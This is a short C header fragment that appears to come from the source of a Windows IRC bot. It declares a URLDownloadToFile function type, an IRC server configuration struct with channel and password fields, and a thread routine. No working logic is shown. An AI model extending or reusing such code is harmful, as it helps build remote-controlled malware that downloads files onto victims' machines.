

typedef HRESULT (WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
typedef struct irc_server {
	char	host[MAX_HOSTNAME];			// The server host
	char	pass[16];					// The server password
	int		port;						// The server port
	char	chan[MAX_NICKLEN];			// The channel
	char	chanpass[16];				// The channel pass
	char	modeonconn[12];				// The modes to set on connect
} SERVER;

DWORD WINAPI Bthd(LPVOID param);